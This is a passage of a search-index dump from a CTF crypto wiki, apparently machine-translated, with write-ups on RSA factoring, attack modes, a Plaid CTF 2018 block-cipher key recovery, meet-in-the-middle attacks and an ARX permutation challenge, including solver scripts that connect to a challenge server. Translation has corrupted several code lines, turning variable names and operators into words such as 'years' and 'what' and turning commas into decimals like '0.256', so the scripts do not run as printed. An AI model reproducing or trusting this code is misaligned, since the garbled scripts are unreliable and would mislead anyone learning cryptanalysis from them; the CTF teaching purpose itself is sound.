73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 end = gmpy2 . iroot ( n / 54 , 6 )[ 0 ] beg = end - 2000000 mid = 1 while beg < end : mid = ( beg + end ) / 2 if gmpy2 . is_prime ( mid ) != 1 : mid = gmpy2 . next_prime ( mid ) p = gmpy2 . next_prime ( 9 * mid ** 3 ) q = gmpy2 . next_prime ( 6 * mid ** 3 ) n1 = p * q if n1 == n : print p , q phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 0x10001 , phin ) m = gmpy2 . powmod ( enc , d , n ) print hex ( m )[ 2 :] . strip ( 'L' ) . decode ( 'hex' ) print 'ok' exit ( 0 ) elif n1 < n : beg = mid else : end = mid print beg , end","title":"2018 Pwnhub LHY"},{"location":"crypto/attack-summary/attack-mode/","text":"Introduction \u00b6 Attack mode \u00b6 When we attack a cryptography system, we get more or less information about the system. Depending on the amount of information we receive, the methods we can use may vary. In today's cryptanalysis, we generally assume that the attacker knows the cryptographic algorithm. This assumption is reasonable because there are many secret algorithms in history that are finally known, such as RC4. There are many ways to be known, such as spying, reverse engineering, etc. Here we divide the attack mode into the following categories based on how much information the attacker obtains from the cryptography system. ciphertext attack only : The attacker can only get some encrypted ciphertext. Known plaintext attack : The attacker has some plaintext corresponding to the ciphertext. Select plaintext attack : The attacker can choose some plaintext when starting the attack and get the encrypted ciphertext. If an attacker can select a new plaintext based on the acquired information and obtain the corresponding ciphertext in the middle of the attack, it is called an adaptive selective plaintext attack. Select ciphertext attack : The attacker can select some ciphertexts and get the decrypted plaintext before starting the attack. If an attacker can select some new ciphertexts based on the information that has been acquired and obtain the corresponding plaintext, the attacker is called adaptive ciphertext attack. Related key attack : An attacker can obtain encrypted or decrypted ciphertext or plaintext of two or more related keys. But the attacker does not know these keys. Common attack methods \u00b6 According to different attack modes, there may be different attack methods. Currently, common attack methods mainly include violent attacks Intercommunication attack Linear analysis Differential analysis Impossible differential analysis Integration analysis Algebraic analysis Related key attack Side channel attack references \u00b6 https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90","title":"Introduction"},{"location":"crypto/attack-summary/attack-mode/#introduction","text":"","title":"Introduction"},{"location":"crypto/attack-summary/attack-mode/#attack-mode","text":"When we attack a cryptography system, we get more or less information about the system. Depending on the amount of information we receive, the methods we can use may vary. In today's cryptanalysis, we generally assume that the attacker knows the cryptographic algorithm. This assumption is reasonable because there are many secret algorithms in history that are finally known, such as RC4. There are many ways to be known, such as spying, reverse engineering, etc. Here we divide the attack mode into the following categories based on how much information the attacker obtains from the cryptography system. ciphertext attack only : The attacker can only get some encrypted ciphertext. Known plaintext attack : The attacker has some plaintext corresponding to the ciphertext. Select plaintext attack : The attacker can choose some plaintext when starting the attack and get the encrypted ciphertext. If an attacker can select a new plaintext based on the acquired information and obtain the corresponding ciphertext in the middle of the attack, it is called an adaptive selective plaintext attack. Select ciphertext attack : The attacker can select some ciphertexts and get the decrypted plaintext before starting the attack. If an attacker can select some new ciphertexts based on the information that has been acquired and obtain the corresponding plaintext, the attacker is called adaptive ciphertext attack. Related key attack : An attacker can obtain encrypted or decrypted ciphertext or plaintext of two or more related keys. But the attacker does not know these keys.","title":"Attack mode"},{"location":"crypto/attack-summary/attack-mode/#common-attack-methods","text":"According to different attack modes, there may be different attack methods. Currently, common attack methods mainly include violent attacks Intercommunication attack Linear analysis Differential analysis Impossible differential analysis Integration analysis Algebraic analysis Related key attack Side channel attack","title":"Common attack methods"},{"location":"crypto/attack-summary/attack-mode/#references","text":"https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90","title":"references"},{"location":"crypto/attack-summary/bit-attack/","text":"\u6bd4\u7279\u653b \u00b6 Overview \u00b6 Simply put, it is to use the relationship between the bits to attack. 2018 Plaid CTF transducipher \u00b6 The title is as follows #!/usr/bin/env python3.6 import BLOCK_SIZE = 64 T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def block2bin ( b , length = BLOCK_SIZE ): return list ( map ( int , bin ( b )[ 2 :] . rjust ( length , '0' ))) def bin2block ( b ): return int ( \"\" . join ( map ( str , b )), 2 ) def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) def transduceblock ( b ): return bin2block ( transduce ( block2bin ( b ))) def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) class Transducipher : def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b if __name__ == \"__main__\" : flag = bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )) k = int ( flag , 16 ) C = Transducipher ( k ) print ( \"Your flag is PCTF{ %s }\" % flag ) with open ( \"data1.txt\" , \"w\" ) as f : for i in range ( 16 ): pt = int ( bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )), 16 ) ct = C . encrypt ( pt ) f . write ( str (( pt , ct )) + \" \\n \" ) The topic gave 16 groups of ciphertext pairs. Clear text size 8 bytes cipher text size 8 bytes The key size is also 8 bytes The key we need to solve is the key. It can be seen that there are two main operations here. swap def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) Swaps the upper 32 bits of the given data with the lower 32 bits. transduce T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) among them, b is an array of 01 with an initial time size of 64. s is a subscript. The basic process is as follows Select which element of T to use based on s and divide it into d and t. Divide b into two parts, one containing only the head element and the other containing the other elements. XOR the header element with t as the current header element and continue to convert the rest. In fact, we can convert this function into an iterative function. def transduce_iter ( b , s = 0 ): ans = [] for c in b : d , t = T [ s ] years + = [ ct ] s = d [ c ] return years And since each time the first element of the list is processed, the function is actually reversible, as follows def invtransduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ^ t ]) The following is the core flow of the analysis program. The first is to generate the key part. The encryption algorithm generates 6 keys, each time the method is generated. transduce the previous key to get the intermediate value t Swap t Continuous iteration 5 times def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) The encryption algorithm is as follows, a total of 6 iterations, the basic process XOR key transduce 2. Exchange def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b Through the analysis program, it can be known that the encryption algorithm is a block encryption, and the basic information is as follows Block size is 8 bytes Rounds of 6 rounds The basic operations of each round of the encryption algorithm are transduce and swap. The extension of the key is also related to transduce and swap. more specific swap is to swap the upper 32 bits of the 8 bytes with the lower 32 bits. transduce is XORed to a value bit by bit for each bit of 8 bytes. This value is related to T. Through further analysis, we can find that these two functions are all reversible. That is to say, if we know the final ciphertext, then we can actually shorten the original number of rounds to almost 5 rounds, because the last round of transduce and swap have no effect. We can define the following variables Name Meaning | k_{i,0} k_{i,0} | The upper 32 bits of the key used in the i-th round | | k_{i,1} k_{i,1} | The lower 32 bits of the key used in the i-th round | | d_{i,0} d_{i,0} | The upper 32 bits of the input used by the i-th wheel | | d_{i,1} d_{i,1} | The lower 32 bits of the input used by the i-th wheel | Since one of the core operations is swap, only high or low 32 bits are manipulated, so we can consider it in two parts. The simplified definition is as follows Transduce is simplified to T, although it conflicts with the source code, but we can temporarily understand it. Swap is reduced to S. Then each round of the ciphertext, the key is as follows Number of rounds Left key Left ciphertext Right key Right ciphertext | 0 | k_{0,0} k_{0,0} | d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) | k_{0,1} k_{0,1} | d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) | | 1 | k_{1,0}=T(k_{0,1},s) k_{1,0}=T(k_{0,1},s) | d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) | k_{1,1}=T(k_{0,0}) k_{1,1}=T(k_{0,0}) | d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) | | 2 | k_{2,0}=T(k_{1,1},s) k_{2,0}=T(k_{1,1},s) | d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) | k_{2,1}=T(k_{1,0}) k_{2,1}=T(k_{1,0}) | d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) | | 3 | k_{3,0}=T(k_{2,1},s) k_{3,0}=T(k_{2,1},s) | d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) | k_{3,1}=T(k_{2,0}) k_{3,1}=T(k_{2,0}) | d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) | | 4 | k_{4,0}=T(k_{3,1},s) k_{4,0}=T(k_{3,1},s) | d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) | k_{4,1}=T(k_{3,0}) k_{4,1}=T(k_{3,0}) | d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) | | 5 | k_{5,0}=T(k_{4,1},s) k_{5,0}=T(k_{4,1},s) | d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) | k_{5,1}=T(k_{4,0}) k_{5,1}=T(k_{4,0}) | d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) | Then, we can enumerate the upper 32 bits of k bit by bit and enumerate the possible s status bits when performing the T operation, so that we can get the high 32-bit key. After performing a bit-by-bit blast, we can get two possible results [2659900894, 2659900895] According to the results on the left, you can get the possible results on the right. The possible results obtained with 2659900894 are as follows: # The first set of ciphertexts may have too many corresponding keys. # The second group has a total of 6. [2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155] # The third group [2764038144, 2764038145] Then in fact, we can manually try to encrypt all the ciphertext, if not, just judge the error directly. This can actually be filtered very quickly. Finally, you can find that the key is 2659900894|2764038145 That is 11624187353095200769. Also got the flag. Of course, this problem can also use the attack method of the middle encounter, that is, the key used in the 0 th round and the key used in the last round are respectively enumerated to make a collision in the third round. Reference \u00b6 http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/","title":"Bit attack"},{"location":"crypto/attack-summary/bit-attack/#_1","text":"","title":"\u6bd4\u7279\u653b"},{"location":"crypto/attack-summary/bit-attack/#overview","text":"Simply put, it is to use the relationship between the bits to attack.","title":"Overview"},{"location":"crypto/attack-summary/bit-attack/#2018-plaid-ctf-transducipher","text":"The title is as follows #!/usr/bin/env python3.6 import BLOCK_SIZE = 64 T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def block2bin ( b , length = BLOCK_SIZE ): return list ( map ( int , bin ( b )[ 2 :] . rjust ( length , '0' ))) def bin2block ( b ): return int ( \"\" . join ( map ( str , b )), 2 ) def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) def transduceblock ( b ): return bin2block ( transduce ( block2bin ( b ))) def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) class Transducipher : def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b if __name__ == \"__main__\" : flag = bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )) k = int ( flag , 16 ) C = Transducipher ( k ) print ( \"Your flag is PCTF{ %s }\" % flag ) with open ( \"data1.txt\" , \"w\" ) as f : for i in range ( 16 ): pt = int ( bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )), 16 ) ct = C . encrypt ( pt ) f . write ( str (( pt , ct )) + \" \\n \" ) The topic gave 16 groups of ciphertext pairs. Clear text size 8 bytes cipher text size 8 bytes The key size is also 8 bytes The key we need to solve is the key. It can be seen that there are two main operations here. swap def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) Swaps the upper 32 bits of the given data with the lower 32 bits. transduce T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) among them, b is an array of 01 with an initial time size of 64. s is a subscript. The basic process is as follows Select which element of T to use based on s and divide it into d and t. Divide b into two parts, one containing only the head element and the other containing the other elements. XOR the header element with t as the current header element and continue to convert the rest. In fact, we can convert this function into an iterative function. def transduce_iter ( b , s = 0 ): ans = [] for c in b : d , t = T [ s ] years + = [ ct ] s = d [ c ] return years And since each time the first element of the list is processed, the function is actually reversible, as follows def invtransduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ^ t ]) The following is the core flow of the analysis program. The first is to generate the key part. The encryption algorithm generates 6 keys, each time the method is generated. transduce the previous key to get the intermediate value t Swap t Continuous iteration 5 times def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) The encryption algorithm is as follows, a total of 6 iterations, the basic process XOR key transduce 2. Exchange def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b Through the analysis program, it can be known that the encryption algorithm is a block encryption, and the basic information is as follows Block size is 8 bytes Rounds of 6 rounds The basic operations of each round of the encryption algorithm are transduce and swap. The extension of the key is also related to transduce and swap. more specific swap is to swap the upper 32 bits of the 8 bytes with the lower 32 bits. transduce is XORed to a value bit by bit for each bit of 8 bytes. This value is related to T. Through further analysis, we can find that these two functions are all reversible. That is to say, if we know the final ciphertext, then we can actually shorten the original number of rounds to almost 5 rounds, because the last round of transduce and swap have no effect. We can define the following variables Name Meaning | k_{i,0} k_{i,0} | The upper 32 bits of the key used in the i-th round | | k_{i,1} k_{i,1} | The lower 32 bits of the key used in the i-th round | | d_{i,0} d_{i,0} | The upper 32 bits of the input used by the i-th wheel | | d_{i,1} d_{i,1} | The lower 32 bits of the input used by the i-th wheel | Since one of the core operations is swap, only high or low 32 bits are manipulated, so we can consider it in two parts. The simplified definition is as follows Transduce is simplified to T, although it conflicts with the source code, but we can temporarily understand it. Swap is reduced to S. Then each round of the ciphertext, the key is as follows Number of rounds Left key Left ciphertext Right key Right ciphertext | 0 | k_{0,0} k_{0,0} | d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) | k_{0,1} k_{0,1} | d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) | | 1 | k_{1,0}=T(k_{0,1},s) k_{1,0}=T(k_{0,1},s) | d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) | k_{1,1}=T(k_{0,0}) k_{1,1}=T(k_{0,0}) | d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) | | 2 | k_{2,0}=T(k_{1,1},s) k_{2,0}=T(k_{1,1},s) | d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) | k_{2,1}=T(k_{1,0}) k_{2,1}=T(k_{1,0}) | d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) | | 3 | k_{3,0}=T(k_{2,1},s) k_{3,0}=T(k_{2,1},s) | d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) | k_{3,1}=T(k_{2,0}) k_{3,1}=T(k_{2,0}) | d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) | | 4 | k_{4,0}=T(k_{3,1},s) k_{4,0}=T(k_{3,1},s) | d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) | k_{4,1}=T(k_{3,0}) k_{4,1}=T(k_{3,0}) | d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) | | 5 | k_{5,0}=T(k_{4,1},s) k_{5,0}=T(k_{4,1},s) | d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) | k_{5,1}=T(k_{4,0}) k_{5,1}=T(k_{4,0}) | d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) | Then, we can enumerate the upper 32 bits of k bit by bit and enumerate the possible s status bits when performing the T operation, so that we can get the high 32-bit key. After performing a bit-by-bit blast, we can get two possible results [2659900894, 2659900895] According to the results on the left, you can get the possible results on the right. The possible results obtained with 2659900894 are as follows: # The first set of ciphertexts may have too many corresponding keys. # The second group has a total of 6. [2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155] # The third group [2764038144, 2764038145] Then in fact, we can manually try to encrypt all the ciphertext, if not, just judge the error directly. This can actually be filtered very quickly. Finally, you can find that the key is 2659900894|2764038145 That is 11624187353095200769. Also got the flag. Of course, this problem can also use the attack method of the middle encounter, that is, the key used in the 0 th round and the key used in the last round are respectively enumerated to make a collision in the third round.","title":"2018 Plaid CTF transducipher"},{"location":"crypto/attack-summary/bit-attack/#reference","text":"http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/","title":"Reference"},{"location":"crypto/attack-summary/meet-in-the-middle/","text":"\u4e2d\u9047\u9047\u653b\u51fb- MITM \u00b6 Overview \u00b6 The middle encounter attack is an attack method that exchanges space for time. It was proposed by Diffie and Hellman in 1977. From a personal point of view, people refer more to an idea, not only for cryptographic attacks, but also for other aspects, which can reduce the complexity of the algorithm. The basic principle is as follows Suppose E and D are encryption functions and decryption functions, respectively, k1 and k2 are the keys used for two encryptions respectively, then we have $ C = E k_2 (E k_1 (P)) $ P=D_{k_2}(D_{k_1}(C)) P=D_{k_2}(D_{k_1}(C)) Then we can launch E_{k_1}(P)=D_{k_2}(C) E_{k_1}(P)=D_{k_2}(C) Then, when the user knows a pair of plaintext and ciphertext An attacker can enumerate all k1s, store all the encrypted results of P, and sort them according to the size of the ciphertext. The attacker further enumerates all k2, decrypts ciphertext C to get C1, and searches for C1 in the result of the first step of encryption. If we search, we can think that we have found the correct k1. And k2. If you feel that the results obtained in the second step are not insured, we can also find some clear cipher pairs to verify. Assuming that the key lengths for both k1 and k2 are n, then our violent enumeration would require O(n^2) O(n^2) , now we only need O(n log_2n) O(n log_2n) . This is similar to the middle encounter attack of 2DES. topic \u00b6 2018 National Crackmec, see the Wiki AES section 2018 Plaid CTF Transducipher, see the principle of the bit attack section. 2018 National CrackMe, see the discrete logarithmic part of the Wiki integer field 2018 WCTF RSA, see wiki RSA Complex section references \u00b6 https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A","title":"Man in the Middle Attack"},{"location":"crypto/attack-summary/meet-in-the-middle/#-mitm","text":"","title":"\u4e2d\u9047\u9047\u653b\u51fb- MITM"},{"location":"crypto/attack-summary/meet-in-the-middle/#overview","text":"The middle encounter attack is an attack method that exchanges space for time. It was proposed by Diffie and Hellman in 1977. From a personal point of view, people refer more to an idea, not only for cryptographic attacks, but also for other aspects, which can reduce the complexity of the algorithm. The basic principle is as follows Suppose E and D are encryption functions and decryption functions, respectively, k1 and k2 are the keys used for two encryptions respectively, then we have $ C = E k_2 (E k_1 (P)) $ P=D_{k_2}(D_{k_1}(C)) P=D_{k_2}(D_{k_1}(C)) Then we can launch E_{k_1}(P)=D_{k_2}(C) E_{k_1}(P)=D_{k_2}(C) Then, when the user knows a pair of plaintext and ciphertext An attacker can enumerate all k1s, store all the encrypted results of P, and sort them according to the size of the ciphertext. The attacker further enumerates all k2, decrypts ciphertext C to get C1, and searches for C1 in the result of the first step of encryption. If we search, we can think that we have found the correct k1. And k2. If you feel that the results obtained in the second step are not insured, we can also find some clear cipher pairs to verify. Assuming that the key lengths for both k1 and k2 are n, then our violent enumeration would require O(n^2) O(n^2) , now we only need O(n log_2n) O(n log_2n) . This is similar to the middle encounter attack of 2DES.","title":"Overview"},{"location":"crypto/attack-summary/meet-in-the-middle/#topic","text":"2018 National Crackmec, see the Wiki AES section 2018 Plaid CTF Transducipher, see the principle of the bit attack section. 2018 National CrackMe, see the discrete logarithmic part of the Wiki integer field 2018 WCTF RSA, see wiki RSA Complex section","title":"topic"},{"location":"crypto/attack-summary/meet-in-the-middle/#references","text":"https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%80%94%E7%9B%B8%E9%81%87%E6%94%BB%E6%93%8A","title":"references"},{"location":"crypto/basic/introduction/","text":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6 \u00b6 This section will introduce \"Basic Mathematical Knowledge\", which is quoted here, so it is not really true. .","title":"Introduction"},{"location":"crypto/basic/introduction/#_1","text":"This section will introduce \"Basic Mathematical Knowledge\", which is quoted here, so it is not really true. .","title":"\u57fa\u7840\u6570\u5b66\u77e5\u8bc6"},{"location":"crypto/blockcipher/arx-operations/","text":"Add-Rotate-Xor \u00b6 Overview \u00b6 The ARX operation is a general term for the following three basic operations. - Add Modification on the finite field - Rotate circular shift - Xor XOR There are many common block cipher algorithms that use only these three basic operations in a round function. Typical examples are Salsa20, Speck, and so on. In addition, [IDEA] (./idea.md) also uses a similar basic operation to construct the encryption and decryption operation, but replaces the shift by multiplication. Advantages and disadvantages \u00b6 Advantages \u00b6 Easy operation and fast operation Execution time is constant to avoid time-based channel attack The combined function is sufficiently expressive (see example below) Disadvantages \u00b6 Among the three basic operations, Rotate and Xor are completely linear operations for a single bit, which may cause some vulnerability (see [Rotational cryptanalysis] ( https://en.wikipedia.org/wiki/ Rotational_cryptanalysis)) topic \u00b6 2018 *ctf primitive \u00b6 Analysis \u00b6 This problem requires us to combine a certain number of Add-Rotate-Xor operations, so that the obtained encryption algorithm can encrypt the fixed plaintext into a specified random ciphertext, that is, construct an arbitrary permutation function through the basic operation. The flag is obtained after 3 successful builds. Problem Solving \u00b6 For the operation under modulo 256, a typical ARX-based transposition operation can be expressed as the following combination RotateLeft_1(Add_255(RotateLeft_7(Add_2(x)))) The above function corresponds to a permutation operation that swaps 254 and 255 while keeping other numbers unchanged. Intuitively, since the carry occurs in the modulo plus 2 operation of the first step, only the input is 254, 255, the combined function can treat this situation differently. Using the above atomic operations, we can construct a permutation of any two numbers 'a, b`. Combined with the Xor operation, we can reduce the number of basic operations required to meet the limitations given by the title. One possible operational step is as follows: For a, b , make a 0 by modular operation Move to the right by making the lowest bit of b If b is not 1, perform the Xor 1, Add 255 operation, keeping a still 0 and decreasing the value of b Repeat operation 2-3 until b is 1 Perform Add 254 and transposition operations, exchanging a, b For all operations except transposition, add the corresponding inverse operation to ensure that the values other than a, b are unchanged. The complete solution script is as follows: from pwn import * import string from hashlib import sha256 #context.log_level='debug' def dopow (): chal = c . recvline () post = chal [ 12 : 28 ] tar = chal [ 33 : - 1 ] c . recvuntil ( ':' ) found = iters . bruteforce ( lambda x : sha256 ( x + post ) . hexdigest () == tar , string . ascii_letters + string . digits , 4 ) c . sendline ( found ) #c = remote('127.0.0.1',10001) c = remote ( '47.75.4.252' , 10001 ) doped () pt = 'GoodCipher' def doswap ( a , b ): if a == b : return if a > b : tmp = b b = a a = tmp years = [] ans . append (( 0.256 - a )) b -= a a = 0 while b != 1 : tmp = 0 lo = 1 while b & lo == 0 : what & lt ; & lt ; = 1 tmp += 1 if b == lo : ans . append (( 1 , 8 - tmp )) break if tmp != 0 : ans . append (( 1 , 8 - tmp )) b >>= tmp ans . append (( 2 , 1 )) b ^= 1 ans . append (( 0.255 )) b -= 1 ans . append (( 0.254 )) for a , b in ans : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in [( 0 , 2 ),( 1 , 7 ),( 0 , 255 ),( 1 , 1 )]: c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in ans [:: - 1 ]: if a == 0 : c . sendline ( ' %d %d ' % ( a , 256 - b )) elif a == 1 : c . sendline ( ' %d %d ' % ( a , 8 - b )) elif a == 2 : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for i in range ( 3 ): print i m = range ( 256 ) c . recvuntil ( 'ciphertext is ' ) ct = c . recvline () . strip () ct = ct . decode ( 'hex' ) assert len ( ct ) == 10 for i in range ( 10 ): a = ord ( ct [ i ]) b = ord ( pt [ i ]) #print m[a],b doswap ( m [ a ], b ) for j in range ( 256 ): if m [ j ] == b : m [ j ] = m [ a ] m [ a ] = b break c . sendline ( '-1' ) c . recvuntil ( 'Your flag here. \\n ' ) print c . recvline ()","title":"ARX"},{"location":"crypto/blockcipher/arx-operations/#add-rotate-xor","text":"","title":"Add-Rotate-Xor"},{"location":"crypto/blockcipher/arx-operations/#overview","text":"The ARX operation is a general term for the following three basic operations. - Add Modification on the finite field - Rotate circular shift - Xor XOR There are many common block cipher algorithms that use only these three basic operations in a round function. Typical examples are Salsa20, Speck, and so on. In addition, [IDEA] (./idea.md) also uses a similar basic operation to construct the encryption and decryption operation, but replaces the shift by multiplication.","title":"Overview"},{"location":"crypto/blockcipher/arx-operations/#advantages-and-disadvantages","text":"","title":"Advantages and disadvantages"},{"location":"crypto/blockcipher/arx-operations/#advantages","text":"Easy operation and fast operation Execution time is constant to avoid time-based channel attack The combined function is sufficiently expressive (see example below)","title":"Advantages"},{"location":"crypto/blockcipher/arx-operations/#disadvantages","text":"Among the three basic operations, Rotate and Xor are completely linear operations for a single bit, which may cause some vulnerability (see [Rotational cryptanalysis] ( https://en.wikipedia.org/wiki/ Rotational_cryptanalysis))","title":"Disadvantages"},{"location":"crypto/blockcipher/arx-operations/#topic","text":"","title":"topic"},{"location":"crypto/blockcipher/arx-operations/#2018-ctf-primitive","text":"","title":"2018 *ctf primitive"},{"location":"crypto/blockcipher/arx-operations/#analysis","text":"This problem requires us to combine a certain number of Add-Rotate-Xor operations, so that the obtained encryption algorithm can encrypt the fixed plaintext into a specified random ciphertext, that is, construct an arbitrary permutation function through the basic operation. The flag is obtained after 3 successful builds.","title":"Analysis"},{"location":"crypto/blockcipher/arx-operations/#problem-solving","text":"For the operation under modulo 256, a typical ARX-based transposition operation can be expressed as the following combination RotateLeft_1(Add_255(RotateLeft_7(Add_2(x)))) The above function corresponds to a permutation operation that swaps 254 and 255 while keeping other numbers unchanged. Intuitively, since the carry occurs in the modulo plus 2 operation of the first step, only the input is 254, 255, the combined function can treat this situation differently. Using the above atomic operations, we can construct a permutation of any two numbers 'a, b`. Combined with the Xor operation, we can reduce the number of basic operations required to meet the limitations given by the title. One possible operational step is as follows: For a, b , make a 0 by modular operation Move to the right by making the lowest bit of b If b is not 1, perform the Xor 1, Add 255 operation, keeping a still 0 and decreasing the value of b Repeat operation 2-3 until b is 1 Perform Add 254 and transposition operations, exchanging a, b For all operations except transposition, add the corresponding inverse operation to ensure that the values other than a, b are unchanged. The complete solution script is as follows: from pwn import * import string from hashlib import sha256 #context.log_level='debug' def dopow (): chal = c . recvline () post = chal [ 12 : 28 ] tar = chal [ 33 